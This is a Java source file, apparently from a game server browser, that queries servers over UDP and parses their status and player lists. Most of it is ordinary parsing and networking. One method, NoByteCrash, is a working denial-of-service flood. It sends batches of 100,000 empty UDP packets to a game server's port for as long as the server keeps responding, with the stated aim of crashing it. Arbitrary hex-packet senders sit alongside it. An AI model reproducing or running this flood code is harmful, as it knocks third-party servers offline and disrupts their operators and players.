package launcher;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

public class Server extends Thread {

    public String name;
    public String ip;
    public int port;
    String ips;
    String map;
    public int numpl;
    public int maxpl;
    String uptime;
    String time;
    String mapstat;
    boolean password;
    DatagramSocket socket;
    List<Player> players;
    boolean stop = false;
    public String PasswordStatus;

    public Server(String IP) {
        try {
            this.ips = IP;
            this.ip = IP.substring(0, IP.indexOf(':'));
            this.port = Integer.parseInt(IP.substring(IP.indexOf(':') + ":".length(), IP.indexOf(" [", IP.indexOf(':') + 1)));
            this.PasswordStatus = IP.substring(IP.indexOf('[') + "[".length(), IP.indexOf(']', IP.indexOf('{') + 1));
            this.socket = new DatagramSocket();
        } catch (SocketException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public Server(Server server) {
        try {
            this.ips = server.ips;
            this.ip = server.ip;
            this.port = server.port;
            this.PasswordStatus = server.PasswordStatus;
            this.socket = new DatagramSocket();
        } catch (SocketException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public List<Player> getPlayers() {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte[] buf = "\\players\\".getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(1000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);
            socket.close();
            message = new String(packet.getData());
            message = message.trim();
        } catch (Exception ex) {
            return null;
        }

        this.players = new ArrayList();
        setNewPlayer(message);
        return this.players;
    }

    public void setNewPlayer(String status) {
        while (status.lastIndexOf("player") > 0) {
            String sfrag = "frags_";
            String sdeath = "deaths_";
            String sping = "ping_";
            String steam = "team_";
            String splayer = "player_";
            if (!status.contains(splayer)) {
                return;
            }
            String id = status.substring(status.indexOf(splayer) + splayer.length(), status.indexOf("\\", status.indexOf(splayer) + splayer.length()));
            splayer = splayer + id + "\\";
            sfrag = sfrag + id + "\\";
            sdeath = sdeath + id + "\\";
            sping = sping + id + "\\";
            steam = steam + id + "\\";
            String pom = status.substring(status.indexOf(splayer) + splayer.length(), status.indexOf(sfrag) - 1);
            String nick = pom;
            pom = status.substring(status.indexOf(sfrag) + sfrag.length(), status.indexOf(sdeath) - 1);
            String stats = pom;
            pom = status.substring(status.indexOf(sdeath) + sdeath.length(), status.indexOf(sping) - 1);
            stats = stats + "/" + pom;
            pom = status.substring(status.indexOf(sping) + sping.length(), status.indexOf(steam) - 1);
            String ping = pom;
            pom = status.substring(status.indexOf(steam) + steam.length(), status.indexOf(steam) + steam.length() + 1);
            String team = pom;
            Player p = new Player(id, nick, stats, ping, team);
            status = status.substring(status.indexOf(splayer) + splayer.length() + 2);
            this.players.add(p);
        }
    }

    @Override
    public void run() {
        if (setServer(sendStatus())) {
            Main.lista.add(this);
        }
        Main.update += 1;
    }

    public void NoByteCrash() {
        try {
            byte[] msg = DatatypeConverter.parseHexBinary("");
            DatagramPacket packet = null;
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = msg;
            while ((!this.stop) && (!sendStatus().isEmpty())) {
                DatagramSocket socket = new DatagramSocket();
                for (int i = 0; i < 100000; i++) {
                    socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
                }
                socket.close();
            }
        } catch (Exception ex) {
            System.out.println("Packet: " + ex);
        }
    }

    public String sendStrPck(String msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = msg.getBytes();
            this.socket.setSoTimeout(1000);
            this.socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            this.socket.receive(packet);
            message = new String(packet.getData());
            message = message.trim();
        } catch (Exception ex) {
            System.out.print(".");
        }
        return message;
    }

    public String sendStatus() {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = "\\status\\".getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(1000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);
            socket.close();
            message = new String(packet.getData());
            message = message.trim();
        } catch (Exception ex) {
            return "";
        }
        return message;
    }

    public byte[] sendPck(String str) {
        byte[] msg = DatatypeConverter.parseHexBinary(str);
        DatagramPacket packet = null;
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = msg;
            this.socket.setSoTimeout(1000);

            this.socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
            buf = new byte[4096];

            packet = new DatagramPacket(buf, buf.length);
            this.socket.receive(packet);
        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
        }
        return packet.getData();
    }

    public String sendHexPck(byte[] msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = msg;
            this.socket.setSoTimeout(1000);
            this.socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
            byte[] buff = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buff, buff.length);
            this.socket.receive(packet);
        } catch (Exception ex) {
            //   System.out.println("pakiet " + ex);
        }
        return message;
    }

    public boolean setServer(String status) {
        if (status.length() <= 0) {
            return false;
        }
        try {
            String pom = status.substring(status.indexOf("hostname\\") + 9, status.indexOf("\\hostport"));
            this.name = pom;
            pom = status.substring(status.indexOf("mapname\\") + 8, status.indexOf("\\gametype"));
            this.map = pom;
            pom = status.substring(status.indexOf("numplayers\\") + 11, status.indexOf("\\maxplayers"));
            this.numpl = Integer.parseInt(pom);
            pom = status.substring(status.indexOf("maxplayers\\") + 11, status.indexOf("\\gamemode"));
            this.maxpl = Integer.parseInt(pom);
            pom = status.substring(status.indexOf("uptime\\") + 7, status.indexOf("\\timeleft"));

            int up = Integer.parseInt(pom);
            this.uptime = (up / 60 + "h " + up % 60 + "min");
            pom = status.substring(status.indexOf("timeleft\\") + 9, status.indexOf("\\mapstat"));
            this.time = pom;
            pom = status.substring(status.indexOf("mapstat\\") + 8, status.indexOf("\\timelimit"));
            this.mapstat = pom;
            pom = status.substring(status.indexOf("password\\") + 9, status.indexOf("\\team_t0"));
            if (pom.equals("1")) {
                this.password = true;
            } else {
                this.password = false;
            }
        } catch (StringIndexOutOfBoundsException ex) {
            //    System.out.println("Info-updateInfo " + ex.toString() + status);
        }
        return true;
    }

    public String updateServerStatus() {
        String ServerName, ServerMapAndTime, ServerPlayer;
        try {
            InetAddress servAddr = InetAddress.getByName(this.ip);
            byte[] buf = "\\status\\".getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(1000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, this.port));
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);
            socket.close();
            String PacketData = new String(packet.getData());
            PacketData = PacketData.trim();
            ServerName = "Server Name: " + PacketData.substring(PacketData.indexOf("hostname\\") + 9, PacketData.indexOf("\\hostport"));
            ServerMapAndTime = "Map: " + PacketData.substring(PacketData.indexOf("mapname\\") + 8, PacketData.indexOf("\\gametype")) + " | Maptime: " + PacketData.substring(PacketData.indexOf("timeleft\\") + 9, PacketData.indexOf("\\mapstat"));
            ServerPlayer = "Players: " + PacketData.substring(PacketData.indexOf("numplayers\\") + 11, PacketData.indexOf("\\maxplayers")) + "/" + PacketData.substring(PacketData.indexOf("maxplayers\\") + 11, PacketData.indexOf("\\gamemode"));
        } catch (Exception ex) {
            return null;
        }
        return "ServerName=" + ServerName + "\n" + "ServerMapAndTime=" + ServerMapAndTime + "\n" + "ServerPlayer=" + ServerPlayer;
    }

    public void info() {
        System.out.print(this.ip + " " + this.port + "  ");
        System.out.print(this.name + " ");
        System.out.print(this.uptime + "   ");
        System.out.print(this.map + "  ");
        System.out.print(this.numpl + "/" + this.maxpl + "  ");
        System.out.print(this.time + " ");
        System.out.println(this.mapstat + "    ");
    }
}
